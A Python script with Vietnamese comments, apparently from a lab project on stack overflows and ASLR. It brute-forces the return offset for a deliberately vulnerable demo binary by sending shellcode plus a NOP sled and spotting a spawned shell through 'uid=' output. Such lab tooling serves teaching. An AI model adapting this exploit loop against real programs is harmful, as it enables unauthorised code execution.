#!/usr/bin/env python3
"""
Tìm OFFSET_RET và RET_DELTA khi Phase1 không ra uid= trên máy bạn (GCC/layout khác).

Yêu cầu:
  - ASLR tắt: sudo sysctl -w kernel.randomize_va_space=0
  - Đã build: cd demo_aslr && make

Chạy từ thư mục gốc project:
  python3 tools/find_ret_layout.py
  python3 tools/find_ret_layout.py --fine   # chậm hơn, quét bước 1 byte (delta nhỏ)
"""

from __future__ import annotations

import argparse
import os
import re
import struct
import subprocess
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "exploits"))
from exploit_config import SHELLCODE, get_binary_path, get_demo_dir, stdbuf_wrap_cmd


def _stack_executable(binary: str) -> bool | None:
    try:
        out = subprocess.check_output(["readelf", "-l", binary], stderr=subprocess.DEVNULL, text=True)
    except (OSError, subprocess.CalledProcessError):
        return None
    for line in out.splitlines():
        if "GNU_STACK" not in line:
            continue
        parts = line.split()
        perms = parts[-2] if len(parts) >= 2 else ""
        return "E" in perms
    return None


def parse_buf(line: bytes):
    if b"buffer" not in line.lower():
        return None
    m = re.search(rb"0x[0-9a-fA-F]+", line)
    return int(m.group(0), 16) if m else None


def try_once(binary: str, cwd: str, off: int, delta: int) -> bool:
    if off < len(SHELLCODE):
        return False
    proc = subprocess.Popen(
        stdbuf_wrap_cmd(binary),
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        cwd=cwd,
        bufsize=0,
    )
    try:
        proc.stdout.readline()
        proc.stdout.readline()
        line_buf = proc.stdout.readline()
        proc.stdout.readline()
        buf = parse_buf(line_buf)
        if buf is None:
            proc.kill()
            return False
        ret = buf + delta
        payload = SHELLCODE + b"\x90" * (off - len(SHELLCODE)) + struct.pack("<Q", ret)
        try:
            proc.stdin.write(payload + b"\n")
            proc.stdin.write(b"id\n")
            proc.stdin.write(b"exit\n")
        except BrokenPipeError:
            pass
        proc.stdin.close()
        out = proc.stdout.read()
        proc.wait(timeout=8)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait()
        return False
    return re.search(rb"uid=\d+", out) is not None


def scan(binary: str, cwd: str, offs: range, deltas: range, label: str) -> tuple[int, int] | None:
    total = len(offs) * len(deltas)
    n = 0
    for off in offs:
        for delta in deltas:
            n += 1
            if n % 200 == 0 or n == 1:
                print(f"  [{label}] {n}/{total} (off={off} delta={delta})...", flush=True)
            if try_once(binary, cwd, off, delta):
                return off, delta
    return None


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--fine", action="store_true", help="Thêm vòng quét bước 1 (chậm)")
    args = ap.parse_args()

    binary = get_binary_path()
    cwd = get_demo_dir()
    if not os.path.isfile(binary):
        print("Không thấy binary. Chạy: cd demo_aslr && make", file=sys.stderr)
        return 1

    sx = _stack_executable(binary)
    if sx is False:
        print(
            "CẢNH BÁO: GNU_STACK không executable — shellcode trên stack sẽ không chạy.",
            "Build lại với -z execstack (Makefile mặc định).",
            file=sys.stderr,
        )
    elif sx is True:
        print("OK: GNU_STACK RWE (stack executable).")

    print(
        "Gợi ý: chạy trước  python3 tools/gdb_measure_offset.py  (nhanh, chính xác hơn brute-force).\n",
        flush=True,
    )
    print("Đang quét brute-force (có thể vài phút)...", flush=True)

    # Thô: offset và delta theo bội 4, phạm vi rộng
    found = scan(
        binary,
        cwd,
        range(48, 280, 4),
        range(-64, 132, 4),
        "coarse",
    )

    if found is None and args.fine:
        print("Thử fine scan (off 64..128 bước 1, delta -8..40 bước 1)...", flush=True)
        found = scan(
            binary,
            cwd,
            range(64, 129),
            range(-8, 41),
            "fine",
        )

    if found is None:
        print("", file=sys.stderr)
        print("Vẫn không tìm thấy. Gợi ý:", file=sys.stderr)
        print("  1) Chạy: python3 tools/find_ret_layout.py --fine", file=sys.stderr)
        print("  2) Kiểm tra: sysctl kernel.randomize_va_space  (phải 0)", file=sys.stderr)
        print("  3) readelf -l demo_aslr/aslr_demo | grep GNU_STACK", file=sys.stderr)
        return 1

    off, delta = found
    print(f"\nFOUND: OFFSET_RET={off}  RET_DELTA={delta}")
    print()
    print("Sửa exploits/exploit_config.py hai dòng:")
    print(f"  OFFSET_RET = {off}")
    print(f"  RET_DELTA = {delta}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
